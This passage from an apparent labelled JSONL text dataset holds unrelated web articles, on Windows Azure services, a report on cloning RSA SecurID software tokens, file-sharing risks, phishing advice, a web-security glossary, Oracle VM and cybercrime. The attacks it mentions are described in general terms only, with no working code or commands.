Azure datacenter, but get sent to another one when the response time from their default datacenter exceeds a certain threshold. For globally distributed applications with many users, having a built-in service to handle problems like these is useful.\nAnalyzing data is a fundamental part of how businesses use information technology. A cloud platform provides a pool of on-demand, pay-per-use resources, which makes it a good foundation for this kind of computing. Accordingly, Windows Azure provides two options for business analytics. Figure 5 illustrates the choices.\nFigure 5: For business analytics, Windows Azure provides reporting and support for big data.\nAnalyzing data can take many forms, and so these two options are quite different. It's worth looking at each one separately.\nOne of the most common ways to use stored data is to create reports based on that data. To let you do this with data in SQL Database, Windows Azure provides SQL Reporting. A subset of the reporting services included with SQL Server, SQL Reporting lets you build reporting into applications running on Windows Azure or on premises. The reports you create can be in various formats, including HTML, XML, PDF, Excel, and others, and they can be embedded in applications or viewed via a web browser.\nAnother option for doing analytics with SQL Database data is to use on-premises business intelligence tools. To a client, SQL Database looks like SQL Server, and so the same technologies can work with both. For example, you're free to use on-premises SQL Server Reporting Services to create reports from SQL Database data.\nFor many years, the bulk of data analysis has been done on relational data stored in a data warehouse built with a relational DBMS. This kind of business analytics is still important, and it will be for a long time to come. But what if the data you want to analyze is so big that relational databases just can't handle it? And suppose the data isn't relational? It might be server logs in a datacenter, for example, or historical event data from sensors, or something else. In cases like this, you have what's known as a big data problem. You need another approach.\nThe dominant technology today for analyzing big data is Hadoop. An Apache open source project, this technology stores data using the Hadoop Distributed File System (HDFS), then lets developers create MapReduce jobs to analyze that data. HDFS spreads data across multiple servers, then runs chunks of the MapReduce job on each one, letting the big data be processed in parallel.\nHDInsight is the name of the Windows Azure's Apache Hadoop-based service. As Figure 5 suggests, HDInsight lets HDFS store data on the cluster and distribute it across multiple VMs. It also spreads the logic of a MapReduce job across those VMs. Just as with on-premises Hadoop, data is processed locally-the logic and the data it works on are in the same VM-and in parallel for better performance. HDInsight can also store data in Windows Azure Storage Vault (ASV), which uses blobs. Using ASV allows you to save money because you can delete your HDInsight cluster when not in use, but still keep your data in the cloud.\nHDinsight supports other components of the Hadoop ecosystem as well, including Hive and Pig. Microsoft has also created components that make it easier to work with data produced by HDInsight using traditional BI tools, such as the HiveODBC adapter and Data Explorer that work with Excel.\nNo matter what it's doing, code frequently needs to interact with other code. In some situations, all that's needed is basic queued messaging. In other cases, more complex interactions are required. Windows Azure provides a few different ways to solve these problems. Figure 6 illustrates the choices.\nFigure 6: For connecting applications, Windows Azure provides queues, publish/subscribe, and synchronous connections via the cloud.\nQueuing is a simple idea: One application places a message in a queue, and that message is eventually read by another application. If your application needs just this straightforward service, Windows Azure Queues might be the best choice.\nOne common use of Queues today is to let a web role instance communicate with a worker role instance within the same Cloud Services application. For example, suppose you create a Windows Azure application for video sharing. The application consists of PHP code running in a web role that lets users upload and watch videos, together with a worker role implemented in C# that translates uploaded video into various formats. When a web role instance gets a new video from a user, it can store the video in a blob, then send a message to a worker role via a queue telling it where to find this new video. A worker role instance-it doesn't matter which one-will then read the message from the queue and carry out the required video translations in the background. Structuring an application in this way allows asynchronous processing, and it also makes the application easier to scale, since the number of web role instances and worker role instances can be varied independently.\nWhether they run in the cloud, in your data center, on a mobile device, or somewhere else, applications need to interact. The goal of Windows Azure Service Bus is to let applications running pretty much anywhere exchange data.\nAs Figure 6 shows, Service Bus provides a queuing service. This service isn't identical to the Queues just described, however. Unlike Windows Azure Queues, for example, Service Bus provides a both queues (one-to-one) and publish-and-subscribe mechanisms. With publish-subscribe, an application can send messages to a topic, while other applications can create subscriptions to this topic. This allows one-to-many communication among a set of applications, letting the same message be read by multiple recipients. And queuing isn't the only option: Service Bus also allows direct communication through its relay service, providing a secure way to interact through firewalls. Service Bus relays enable applications to communicate by exchanging messages through an endpoint hosted in the cloud, rather than locally.\nApplications that communicate through Service Bus might be Windows Azure applications or software running on some other cloud platform. They can also be applications running outside the cloud, however. For example, think of an airline that implements reservation services in computers inside its own datacenter. The airline needs to expose these services to many clients, including check-in kiosks in airports, reservation agent terminals, and maybe even customers' phones. It might use Service Bus to do this, creating loosely coupled interactions among the various applications.\nApplications tend to access the same data over and over. One way to improve performance is to keep a copy of that data closer to the application, minimizing the time needed to retrieve it. Windows Azure provides two different services for doing this: in-memory caching of data used by Windows Azure applications and a content delivery network (CDN) that caches blob data on disk closer to its users. Figure 7 shows both.\nFigure 7: A Windows Azure application can cache data in memory, and copies of a blob can be cached at sites around the world.\nAccessing data stored in any of Windows Azure's data management services-SQL Database, Tables, or Blobs-is quite fast. Yet accessing data stored in memory is even faster. Because of this, keeping an in-memory copy of frequently accessed data can improve application performance. You can use Windows Azure's in-memory Caching to do this.\nA Cloud Services application can store data in this cache, then retrieve it directly without needing to access persistent storage. As Figure 7 shows, the cache can be maintained inside your application's VMs or be provided by VMs dedicated solely to caching. In either case, the cache can be distributed, with the data it contains spread across multiple VMs in a Windows Azure datacenter.\nAn application that repeatedly reads a product catalog might benefit from using this kind of caching, for example, since the data it needs will be available more quickly. The technology also supports locking, letting it be used with read/write as well as read-only data. And ASP.NET applications can use the service to store session data with just a configuration change.\nSuppose you need to store blob data that will be accessed by users around the world. Maybe it's a video of the latest World Cup match, for instance, or driver updates, or a popular e-book. Storing a copy of the data in multiple Windows Azure datacenters will help, but if there are lots of users, it's probably not enough. For even better performance, you can use the Windows Azure CDN.\nThe CDN has dozens of sites around the world, each capable of storing copies of Windows Azure blobs. The first time a user in some part of the world accesses a particular blob, the information it contains is copied from a Windows Azure datacenter into local CDN storage in that geography. After this, accesses from that part of the world will use the blob copy cached in the CDN-they won't need to go all the way to the nearest Windows Azure datacenter. The result is faster access to frequently accessed data by users anywhere in the world.\nWorking with identity is part of most applications. For example, knowing who a user is lets an application decide how it should interact with that user. To help you do this, Microsoft provides Windows Azure Active Directory.\nLike most directory services, Windows Azure Active Directory stores information about users and the organizations they belong to. It lets users log in, then supplies them with tokens they can present to applications to prove their identity. It also allows synchronizing user information with Windows Server Active Directory running on premises in your local network. While the mechanisms and data formats used by Windows Azure Active Directory aren’t identical with those used in Windows Server Active Directory, the functions it performs are quite similar.\nIt's important to understand that Windows Azure Active Directory is designed primarily for use by cloud applications. It can be used by applications running on Windows Azure, for example, or on other cloud platforms. It's also used by Microsoft's own cloud applications, such as those in Office 365. If you want to extend your datacenter into the cloud using Windows Azure Virtual Machines and Windows Azure Virtual Network, however, Windows Azure Active Directory isn't the right choice. Instead, you'll want to run Windows Server Active Directory in cloud VMs, as described earlier.\nTo let applications access the information it contains, Windows Azure Active Directory provides a RESTful API called Windows Azure Active Directory Graph. This API lets applications running on any platform access directory objects and the relationships among them. For example, an authorized application might use this API to learn about a user, the groups he belongs to, and other information. Applications can also see relationships between users-their social graph-letting them work more intelligently with the connections among people.\nAnother capability of this service, Windows Azure Active Directory Access Control, makes it easier for an application to accept identity information from Facebook, Google, Windows Live ID, and other popular identity providers. Rather than requiring the application to understand the diverse data formats and protocols used by each of these providers, Access Control translates all of them into a single common format. It also lets an application accept logins from one or more Active Directory domains. For example, a vendor providing a SaaS application might use Windows Azure Active Directory Access Control to give users in each of its customers single sign-on to the application.\nDirectory services are a core underpinning of on-premises computing. It shouldn't be surprising that they're also important in the cloud.\nOne of the most attractive ways to use a cloud platform is for high-performance computing (HPC), The essence of HPC is executing code on many machines at the same time. On Windows Azure, this means running many virtual machines simultaneously, all working in parallel to solve some problem. Doing this requires some way to schedule applications, i.e., to distribute their work across these instances. To allow this, Windows Azure provides the HPC Scheduler.\nThis component can work with HPC applications built to use the industry-standard Message Passing Interface (MPI). Software that does finite element analysis, such as car crash simulations, is one example of this type of application, and there are many others. The HPC Scheduler can also be used with so-called embarrassingly parallel applications, such as Monte Carlo simulations. Whatever problem is addressed, the value it provides is the same: The HPC Scheduler handles the complex problem of scheduling parallel computing work across many Windows Azure virtual machines. The goal is to make it easier to build HPC applications running in the cloud.\nVideo makes up a large part of Internet traffic today, and that percentage will be even larger tomorrow. Yet providing video on the web isn't simple. There are lots of variables, such as the encoding algorithm and the display resolution of the user's screen. Video also tends to have bursts in demand, like a Saturday night spike when lots of people decide they'd like to watch an online movie.\nGiven its popularity, it's a safe bet that many new applications will be created that use video. Yet all of them will need to solve some of the same problems, and making each one solve those problems on its own makes no sense. A better approach is to create a platform that provides common solutions for many applications to use. And building this platform in the cloud has some clear advantages. It can be broadly available on a pay-as-you-go basis, and it can also handle the variability in demand that video applications often face.\nWindows Azure Media Services addresses this problem. It provides a set of cloud components that make life easier for people creating and running applications using video and other media. Figure 8 illustrates the technology.\nFigure 8: Media Services is a platform for applications that provide video and other media to clients around the world.\nAs the figure shows, Media Services provides a set of components for applications that work with video and other media. For example, it includes a media ingest component to upload video into Media Services (where it's stored in Windows Azure Blobs), an encoding component that supports various video and audio formats, a content protection component that provides digital rights management, a component for inserting ads into a video stream, components for streaming, and more. Microsoft partners can also provide components for the platform, then have Microsoft distribute those components and bill on their behalf.\nApplications that use this platform can run on Windows Azure or elsewhere. For example, a desktop application for a video production house might let its users upload video to Media Services, then process it in various ways. Alternatively, a cloud-based content management service running on Windows Azure might rely on Media Services to process and distribute video. Wherever it runs and whatever it does, each application chooses which components it needs to use, accessing them through RESTful interfaces.\nTo distribute what it produces, an application can use the Windows Azure CDN, another CDN, or just send bits directly to users. However it gets there, video created using Media Services can be consumed by various client systems, including Windows, Macintosh, HTML 5, iOS, Android, Windows Phone, Flash, and Silverlight. The goal is to make it easier to create modern media applications.\nThe rise of Software as a Service is transforming how we create applications. It's also transforming how we sell applications. Since a SaaS application lives in the cloud, it makes sense that its potential customers should look for solutions online. And this change applies to data as well as to applications. Why shouldn't people look to the cloud for commercially available datasets? Microsoft addresses both of these concerns with Windows Azure Marketplace and Windows Azure Store, illustrated in Figure 9.\nFigure 9: Windows Azure Marketplace and Windows Azure Store let you find and buy Windows Azure applications and commercial datasets.\nThe difference between the two is that Marketplace is outside of the Windows Azure Management Portal, but the Store can be accessed from the portal. Potential customers can search either to find Windows Azure applications that meet their needs, then sign up to use them either through the application's creator or directly through the Marketplace or Store. Customers can search either for commercial datasets as well, including demographic data, financial data, geographic data, and more. When they find something they like, they can access it either from the vendor, directly through the Marketplace or Store web locations or in some cases from the Management Portal. Applications can also use the Bing Search API through the Marketplace, giving them access to the results of web searches.\nBack in 2008, the very first pre-release version of Windows Azure supported only .NET development. Today, however, you can create Windows Azure applications in pretty much any language. Microsoft currently provides language-specific SDKs for .NET, Java, PHP, Node.js, Ruby, and Python. There's also a general Windows Azure SDK that provides basic support for any language, such as C++.\nThese SDKs help you build, deploy, and manage Windows Azure applications. They're available either from www.windowsazure.com or GitHub, and they can be used with Visual Studio and Eclipse. Windows Azure also offers command line tools that developers can use with any editor or development environment, including tools for deploying applications to Windows Azure from Linux and Macintosh systems.\nAlong with helping you build Windows Azure applications, these SDKs also provide client libraries that help you create software running outside the cloud that uses Windows Azure services. For example, you might build an application running at a hoster that relies on Windows Azure blobs, or create a tool that deploys Windows Azure applications through the Windows Azure management interface.\nNow that you have the big-picture, the next step is to write your first Windows Azure application. Choose your language, get the appropriate SDK, and go for it. Cloud computing is the new default--get started now.", "label": 1}
{"text": "A researcher has devised a method that attackers with control over a victim's computer can use to clone the secret software token that RSA's SecurID uses to generate one-time passwords.\nThe technique, described on Thursday by a senior security analyst at a firm called SensePost, has important implications for the safekeeping of the tokens. An estimated 40 million people use various SecurID tokens to access confidential data belonging to government agencies, military contractors, and corporations. Scrutiny of the widely used two-factor authentication system has grown since last year, when RSA revealed that intruders on its networks stole sensitive SecurID information that could be used to reduce its security. Defense contractor Lockheed Martin later confirmed that a separate attack on its systems was aided by the theft of the RSA data.\nLast week's blog post by SensePost's Behrang Fouladi demonstrated another way determined attackers could in certain cases circumvent protections built into SecurID. By reverse engineering software used to manage the cryptographic software tokens on computers running Microsoft's Windows operating system, he found that the secret \"seed\" was easy for people with control over the machines to locate and copy. He provided step-by-step instructions for others to follow in order to demonstrate how easy it is to create clones that mimic verbatim the output of a targeted SecurID token.\n\"When the above has been performed, you should have successfully cloned the victim's software token and if they run the SecurID software token program on your computer, it will generate the exact same random numbers that are displayed on the victim's token,\" Fouladi wrote.\nHe arrived at that conclusion by reverse engineering the Windows software that allows SecurID users to make one-time passwords appear on their PCs, rather than on match-case-sized hardware tokens RSA provides. The cryptographic seed values at the heart of the SecurID system make it mathematically infeasible for others to predict the output that changes every 90 seconds or so, but only if the values remain secret.\nRSA spokesman Kevin Kempskie told Ars: \"It's not uncommon for a large software company like ours to see security researchers demonstrate theoretical attacks on a product. We have a really experienced product security team and we take these things very seriously and we're going to have them take a closer look at it.\"\nFouladi discovered that the RSA seed value is easy to obtain and copy by anyone with access to a computer that's lost, stolen, or has been compromised with a backdoor trojan. By reading chunks of data returned by a proprietary Microsoft security interface known as the data protection application programming interface (DPAPI), an attacker can obtain and copy the encrypted value. Even when an optional copy protection known as a token binding is in place, it can be bypassed because the required serial number is determined by a combination of the host name and current user's Windows security identifier stored on the computer.\nHe told Ars that smartphones that are lost or stolen might be susceptible to similar attacks, although he stressed he has no reason to believe that the values can be remotely retrieved from smartphones infected with malware, as long as the devices haven't been jailbroken or rooted.\n\"Should people stop using the SecurID software tokens?\" he wrote in an e-mail. \"It depends. It is dependent on the probability of the device being stolen or malicious applications installed from a dubious source. Personally, for high-risk situations, for example government agency laptops for staff that travel and frequently have to connect back to secure networks, using the token, I wouldn't recommend it.\"\nFouladi noted that both RSA and its customers have been targeted by highly motivated hackers, so attack scenarios in which PCs are infected or stolen aren't unrealistic. He suggested the sensitive RSA data should be managed by a industry-wide specification known as the TPM, or trusted platform module.\nPost updated to clarify SecurID's user base and to make clear the attack doesn't deduce seed values.", "label": 1}
{"text": "Ask a high school or college kid about their iPod or video library and you’ll soon hear a lot about file sharing. It’s used as a method for swapping favorite music files, TV shows or movies, often avoiding paying fees for them. And it’s often illegal. With the Recording Industry Association of America (RIAA) actively sending “Cease and Desist” letters to anyone found to be illegally trading copyrighted materials, it’s in your family’s best interest to talk about the right and the wrong ways to find and share music and movies.\nRecently, Sweden erupted in a furor when a new law went into effect including severe penalties for anyone using illegal file sharing systems. It’s estimated that 1 in 10 Swedes uses these systems. When the new law went into effect last week requiring the ISPs to turn in those using these systems, the overall effect was shocking. Internet traffic in Sweden fell by 30%, immediately! According to a Symantec study, an estimated 90% of avid gamers also engage in file sharing. Sweden represents 3% of the worldwide total for file sharing.\nThe reason security companies like Symantec care about file sharing is that it’s so difficult for people to keep these programs secure. By their nature, they open a door into the family computer and invite Internet strangers to come on in, take a few files and leave a few behind. These systems are notorious for spreading viruses and keystroke loggers (dangerous little programs that spy on your every keyboard click and report your private info out to others on the internet.) They've been used to distribute pornography and child pornography, hiding these terrible images with innocuously-coded file names to trick the users of the systems. They are also blamed for criminals getting access to people’s tax records. Here's a story that recently aired on The Today Show about how a family's computer was hacked for their valuable tax records using a popular music sharing service.\nIf you haven’t sat with your teen to discuss the right way to acquire music and watch TV shows and videos online, you need to do so. Your lack of involvement might be risking the safety of your computer and all your private information. Even worse, you may be at risk of legal action if your computer is found to be involved in any of the many illegal activity known to be a part of illegal file sharing systems.\nHere's a good guide to disabling peer to peer file sharing systems.\nAnd this pamphlet from the RIAA for parents and teachers has a comprehensive list of the legal sites for purchasing music.\nMessage Edited by marianmerritt on 04-06-2009 06:12 PM", "label": 1}
{"text": "Every Internet site in the world is facing the growing issue of fraudulent usage of information, and we want to work with users around the world to stop this practice. Please keep reading to learn more about the warning signs and what you can do.\nSpam email is such a common occurrence today that you may think you know what to look for. But there are two types of email scams — what's known as 'phishing' and 'spoofing' — that can be more difficult to identify. Both practices concern fraudulent email where the 'from address' has been forged to make it appear as if it came from somewhere, or someone, other than the actual source. Below are the warning signs to look for:\nWhat's 'phishing' all about - and how do I spot it?\nPhishing emails are used to fraudulently obtain personal identification and account information. They can also be used to lure the recipient into downloading malicious software. The message will often suggest there are issues with the recipient's account that requires immediate attention. A link will also be provided to a spoof website where the recipient will be asked to provide personal/account information or download malicious software. Monster will never ask you to download software in order to access your account or use our services.\nHow is it different than 'spoofing'?\nSpoof emails often include a fraudulent offer of employment and/or the invitation to serve as a go-between for payment processing or money transfers. This scam is primarily directed at a general audience, but it can also reach Monster members who have included contact information on their resume. Like with phishing emails, the sender's address is often disguised.\nExamples of fraudulent email\nThese examples of fraudulent email show you what to watch out for (click to see details):\nConsumer Advice: How to Avoid Phishing Scams\nThe number and sophistication of phishing scams sent out to consumers is continuing to increase dramatically. While online banking and e-commerce is very safe, as a general rule you should be careful about giving out your personal financial information over the Internet. The Anti-Phishing Working Group has compiled a list of recommendations that you can use to avoid becoming a victim of these scams.\n- Be suspicious of any email with urgent requests for personal financial information\n- Phishers typically include upsetting or exciting (but false) statements in their emails to get people to react immediately\n- They typically ask for information such as usernames, passwords, credit card numbers, social security numbers, date of birth, etc.\n- Don't use the links in an email, instant message, or chat to get to any web page if you suspect the message might not be authentic\n- Instead, call the company on the telephone, or log onto the website directly by typing in the Web address in your browser\n- You should only communicate information such as credit card numbers or account information via a secure website or the telephone\n- Always ensure that you're using a secure website when submitting credit card or other sensitive information via your Web browser\nAdditional consumer advice is available at http://antiphishing.org/consumer_recs.html\nContact us at http://www.monster.com/contact/", "label": 1}
{"text": "authentication provider. The party responsible for validating a user's credentials and issuing a token that can be used to access other sites. This is the web site you visit to do the actual authentication.\ncontent injection. In a web application that accepts data input from users, content injection refers to the act of an attacker attempting to insert HTML or client script content that will be processed by a client browser, or SQL commands that the server may process. If successful, content injection of HTML or client scripts will cause the website to behave undesirably for any user that views the injected content because it's being processed by their browser as legitimate HTML or client script. Content injection can result in many undesirable effects, such as causing parts of a web page to disappear, diverting user requests to a malicious location, or allowing an attacker to eavesdrop. SQL injection does not affect the client browser, but if a web application accepts user input and uses it to dynamically create a SQL query without verifying the content, an attacker can inject syntax into the SQL query to manipulate the database and even the database server if it's not locked down properly. This type of attack can lead to deleted data, dropped databases, or even allow operating system commands to run as if you were typing them at the command line.\ncross-site scripting (XSS). An attack whereby scripts from a malicious source are executed on a client browser as part of a trusted web page. Websites that build pages with data elements originating from other sources, such as user input or shared databases, are vulnerable to XSS attacks.\ncross-site request forgery (CSRF). An attack in which a client browser is manipulated into performing malicious actions on a server with which the client has some form of trusted relationship through authentication, HTTPS, or IP filtering. An attacker embeds a link or a script in a piece of untrusted content that does something on the trusted site to which the user is currently authenticated. A simple example is an image element embedded in an HTML email that includes a URL query string, which performs a malicious action. If users click the image, they unknowingly initiate the act on the site where they are authenticated.\nData Model. An object that represents an entity built for data storage services. These are not available for use outside the boundaries of the application and are often encapsulated behind a services layer.\nDomain Model. An object that represents an entity in the problem domain, which may also be annotated or extended to support some application features such as validation or authentication. Because these models need to be shared between the server and client browser, they are sometimes contained within view models and used directly for data-binding in HTML forms. Application models and service models are variations of domain models.\neavesdropping. Exploiting a web application using a network data capture utility to find and record HTTP requests and responses between a website and a client. Eavesdropping can lead to disclosure of sensitive information such as passwords, personal, or financial information, and can potentially allow the execution of spoofing, tampering and message replay attacks.\nflow diagram. A diagram that defines the pages in the site, actions available on those pages, and navigation between pages. This diagram reflects the user stories identified in the requirements.\nForms authentication. Forms authentication enables user and password validation for web applications that do not require Windows authentication.\nForm Model. An entity that represents all of the fields in an HTML form that is specific to a controller action. It contains only the data that is passed into the action. Generally, this corresponds to whatever form is posting back to the server. Form Models (sometimes called Request Models) are a special case of View Models. View Models are more generic in that they may also include additional data needed to render a page. A Form Model might end up being a property on another View Model.\nfragment identifier. The portion of a URL identified by the hash (#). With regard to browser navigation, hyperlinks include them to make the hyperlink unique. When used in conjunction with the hashchange event, page content is able to change without performing a full-page reload.\ngiven-when-then template. A helpful template for defining acceptance criteria that include the context of the test (given), the action being tested (when), and the expected outcome (then). This template provides clear and concise documentation that can be understood by team members and can be used to generate both manual and automated test scripts.\njQuery selectors. A syntactical aspect of jQuery that allows you to select all DOM elements based on specific criteria (tag name, id, attribute name, value, and more). Once the selection is made, jQuery is used to operate on the selected elements.\nJump List. List of commonly used tasks and destinations, enabling easy user access to destinations by eliminating the need to launch the browser and then load the relevant content. Also allows users to perform common tasks without launching the web application in advance. This is a feature of Windows® Internet Explorer® 9.\nmalicious input. Bad data that causes your system to behave undesirably and/or corrupts data.\nmessage replay attack. An attack that alters the contents of a captured HTTP request and re-submits it to the website.\nmessage tampering. When an attacker maliciously alters the content of request and/or response messages flowing between two parties across a network. For example, if a customer submits an order for 100 widgets to an online merchant, an attacker might alter the order request to order 10,000 widgets instead. Message tampering can be part of a message replay attack or a man-in-the-middle attack.\nmock. The typical strategy for isolating your component under test is to supply an alternative component or function that the component calls instead of supplying the real component. These alternative components may also be referred to as fakes, doubles, or stubs.\nmockup. A visual representation that shows what the site will eventually look like. Mockups contain details such as typography, color, gradients, images, and transparency, but no functionality. Mockups should communicate all necessary details of the UI. To do so, multiple mockups for a single page may be required to convey details of the different states of the application.\nmood board. A visual collage made up of images and color palettes from a variety of sources that communicate the emotional connection the application aims to have with the users.\npersona. A representation of a particular type of user the team can identify with. A persona is a user in context that embodies work style, role, motivation, skills, and goals. If you have a complicated or large application, some features might target multiple personas.\npinned site. A feature of Windows Internet Explorer 9 that integrates your website with the Windows 7 desktop. Pinned sites enable easy access to favorite websites and add shortcut functionality similar to shortcuts in Microsoft® Windows applications. With pinned sites enabled for a website, users can pin the site to the Windows 7 taskbar or add the site to the desktop or Start menu. With this feature, you can add site metadata, create custom jump lists, notification icons, and Thumbnail Preview toolbar controls for the websites you develop.\nPlain Old CLR Object (POCO). Refers to a class in the Microsoft .NET Framework that does not have any dependencies on external libraries such as the Entity Framework. For example, if a class inherits from a base class provided in an external library, it is not a POCO.\nprogressive enhancement. Adds features to the client-side experience based on browser capabilities.\nPublish/Subscribe pattern (pub/sub). A messaging pattern that enables loose communication between publishers and subscribers. A pub/sub object manages communication, relieving the publishers and subscribers from having direct knowledge of one another.\nrelying party. The party trying to validate a user based on a security token that was issued by an authentication provider.\nrepository. A set of interfaces and implementations providing methods for data access.\nRepository pattern. This pattern assists the data model in separating data storage concerns from the application logic. The interfaces do not expose any data storage-specific types and the implementation classes use them. You can choose how many repositories to create based on how granular you want to factor the methods and the expected data access pattern from your application.\nrule of thirds. This is a rule of thumb for visual composition that states that an image should be imagined as divided into nine equal parts by two equally-spaced horizontal lines and two equally-spaced vertical lines. Important compositional elements should be placed along these lines or their intersections.\nsafe list. A list that limits input by only allowing what is known to be valid. The advantage of safe lists is that anything that falls outside of the valid set of characters is not allowed.\nsalt. A salt is a value combined with a cryptographic key to make the output of an encryption algorithm more random and less susceptible to attack.\nsandboxing. Technique that allows components of the application to be tested before the entire application is complete. It also makes testing more robust by preventing software defects in one module from blocking or affecting the testing of other modules.\nSingle-Page Interface (SPI) pattern. A pattern for web applications that reduces the number of full-page reloads during user navigation. When a user performs an action, such as selecting a hyperlink, which traditionally requires the site to load a new web page, the application instead modifies the current web page without reloading it.\nsingle-page interface web application. Web application where the user is only required to perform a full-page load once. From that point on, all page changes and data loading is performed without a full-page reload. Hotmail, Office Live, and Twitter are examples of single-page interface web applications.\nsliding expiration. A pre-determined amount of time where an authenticated user can use the site. The amount of time is reset whenever the user makes a new request to the server. The advantage of using a sliding expiration is that it does not force the user to authenticate again if he or she maintains a reasonable level of activity in the application. Otherwise, the user would be redirected to the authentication page after a fixed amount of time had elapsed after the initial authentication.\nstatic web application. Web sites consisting of static HTML pages, CSS, and images. As each page is navigated to, the browser performs a full-page reload.\nstructure. The HTML of the page as it relates to the hierarchy of elements that make up the page, rather than the visual appearance or layout of the UI.\ntopic. The message between the publisher and subscriber in a pub/sub environment. This message, also often referred to as an event, represents the contract between the sender and receiver, and is made up of a name and an optional message body.\nuser gestures. A specific action that a user takes in order to interact with an application. Traditionally, gestures include mouse clicks and keys presses. However, many modern applications also employ interactions in which a user acts more directly on an application. For example, they may touch a screen to swipe, pinch, or pull content.\nViewBag. The name/value keyed collection that lets you store any loosely typed data. ASP.NET MVC 3 introduced the ViewBag (called ViewData in previous versions) in addition to View.Model.\nView Models. Models contained within the MVC application which are built solely for a view to data-bind against. They often follow the same composition hierarchy as the views and partial views.\nwidget method. The method that represents the primary interface for applying the widget to elements and using the widget after it's applied. The widget method is named after the name of the widget.\nwireframe. A diagram that depicts rough placement of the text, data, and basic controls of a UI. These diagrams are tools used to help organize the page's information. A wireframe does not show details of the page.\nwrapped set. A wrapped set is the result of a query that uses a jQuery selector to find elements in the DOM. To call a method on a wrapped set of elements, a selector is used to select elements in the DOM. For example, to add the listing CSS class to all ul elements directly inside a div element, you can use $('div ul').addClass('listing').", "label": 1}
{"text": "At Oracle OpenWorld 2007, Oracle announced new virtualization software, causing a firestorm of interest and a decline in competitor vmware's stock. Oracle VM, which can be downloaded free, is based on the Xen open-source hypervisor product. With\nIt's back to the future for the Oracle database world. The inefficient one server/one database approach of 1990s client-server technology is long gone and Oracle shops are now re-consolidating their data resources, moving back to the mainframe-like centralization of the 1980s. While Oracle touts VM as a latest-and-greatest solution, we need to remember that server virtualization has been around for decades.\nVirtualization is simply the partitioning of a server in order to host multiple OS environments. Whether it's running virtual Windows on your Macintosh laptop or partitioning a 128 CPU mainframe, IT managers are leveraging virtualization solutions to consolidate multiple OS environments. At a high level, virtualization is the process of segregating server resources in a homogeneous environment, but it's most commonly used to host different operating systems within a single monolithic server -- and this is a step toward OS independence.\nA brief history of Oracle virtualization\nOracle rose to dominate the database market primarily because of its ability to run on more than 60 platforms, everything from a mainframe to a Macintosh. However, Oracle soon faced the challenge of running multiple OS environments within the same server. In early 2005, Oracle announced that their version of VMWare would come pre-loaded with both Linux and Oracle, making it easier than ever to run Linux on a MS Windows server. Oracle then embraced the idea of server consolidation via the 11g Grid Initiative. At Openworld 2007, Oracle claimed that 99% of their customers run multiple instances within a single host machine and so began pushing the new VM product.\nAlthough VM is free for download, support will cost $499/year for 1 or 2 CPU systems and $999/year for others. Thus far, VM is limited to Intel platforms, and will support only Linux and Windows servers. Oracle VM also offers a GUI management console (HTML-based) to allow easy management of both the overall OS and the virtual machines running under the master OS. Oracle is incorporating virtualization along several areas:\n- SOA - Oracle plans to incorporate Oracle VM into their Fusion stack, allowing a method for unifying diverse applications onto a single server using SOAP. Oracle President Charles Phillips notes that Oracle VM will help SAP shops migrate from their foreign ERP's to Oracle Applications. \"We want to help customers integrate their software with third-party applications made in Germany,\" he said at OpenWorld.\n- Consolidating heterogeneous environments - Oracle VM is useful for shops that wish to consolidate different applications onto a single hardware platform. A common example is running Windows side-by-side with UNIX (HP/UX, Solaris, AIX, Linux) on a large monolithic server. For example, instead of buying six 2 CPU servers, you can buy one 4 CPU 64-bit server with 16 GB RAM, and save a bundle of cash. For details, see my notes on the trend towards Oracle server consolidation.\n- Oracle OLAP consolidation - Mark Rittman notes the benefits of running Oracle 10g R2 with virtualization with the Oracle Business Intelligence Suite (OLAP).\n- Oracle application server - Oracle Application Server can be run with Oracle on a single server using VM. John Garmany has some good notes on Oracle App Server and virtualization.\n- Students - Using virtualization is popular among people who want to learn RAC on a personal computer, whereby VM can allow a single server to mimic several RAC nodes.\nThe second age of mainframe computing\nThe early 21st century is seeing the second age of mainframe computing, a change away from the minicomputer hardware architectures of past decades. Instead of small, independent servers, the major hardware vendors are pushing large servers with transparent sharing of hardware resources, coining the term \"partitionable servers.\"\nBut how does Oracle VM fit into these existing virtualization techniques? There are some shortcomings of Oracle VM:\n- Unshared resources - Server resources cannot be easily shared, and it counteracts the goal of server consolidation to leverage on a massive shared computing resource.\n- Measurable overhead - We must remember that Oracle VM imposes some overhead, and a savvy DBA will always perform a workload benchmark using other alternatives (containers, para-virtualization) before choosing virtualization.\n- Bad for the DBA job market - Server consolidation is bad for the DBA job market because one of the main reasons for consolidating hardware resources is the savings from reducing DBA staff. A typical shop can save a million dollars a year by removing a dozen DBAs. The one-server/one-application paradigm has proven too expensive, so many enterprises are now moving back to the centralized architectures of old.\nIn sum, Oracle VM fits nicely into the strategic plans for server consolidation but the savvy Oracle professional must recognize that virtualization has both benefits and limitations. It remains to be seen whether VM will become a permanent part of the data center, of if it will be only used as a stopgap tool for shops that want to run Windows in a Linux environment.\nAbout the author\nDonald K. Burleson has been a database administrator since the 1980s and manages the USA's\nlargest remote DBA support service. He is also a popular\nauthor and serves as series editor for Rampant TechPress, a leading provider of Oracle technical books.\nThis was first published in December 2007", "label": 1}
{"text": "Protecting yourself from cybercrime\n(BPT) - Gone are the days when hackers were the weekend enthusiasts you tolerated on the golf course, when viruses were the things that gave you the flu or a cold, and Phish was a popular jam band who served as the inspiration for your favorite flavor of Ben and Jerry's. With the rise of the Internet and electronic devices has come the rise of cyber-related crime.\nCybercrime, as it is called, is defined as a criminal activity using computers or other electronic devices to victimize people, organizations or businesses.\n\"Despite a global recession, improved security and international crackdown efforts, cybercrime has thrived over the last decade, growing by double digits year after year,\" says Clint Kirkwood, a professor of Criminal Justice at Argosy University\n, Orange County and 28-year veteran and retired commanding officer of the vice section of the narcotics division of the Detroit Police Department. While estimates of the cost of cyber crime to businesses and the private sector vary, a 2011 publication released by Javelin Strategy and Research, the annual cost of identity theft alone was $37 billion. \"Today, some of the most successful criminals do not have to leave the comfort of their own homes to pull off crimes bigger than ever. All they need is an Internet connection, a little tech savvy and a lot of bad will,\" says Kirkwood.\nThe Internet Crime Complaint Center received more than 300,000 complaints in 2011, which included such crimes as FBI-related scams, identity theft, advance fee fraud and a host of romance, work-from-home, auto auction, loan intimidation and other scams.\n\"Since the take-off of social networking and the paperless way of conducting business, cyber-based criminal activity has skyrocketed in many corners of the world,\" says Gary Gonzales, a professor in the Criminal Justice program\nat Argosy University, San Diego and police detective in his 16th year of service with the San Diego Police Department. \"Criminals are masking themselves as potential customers, clients or even professionals to lure innocent people into a web of deception and greed. From copyright infringement and cyber bullying to child pornography and spamming, the impact is 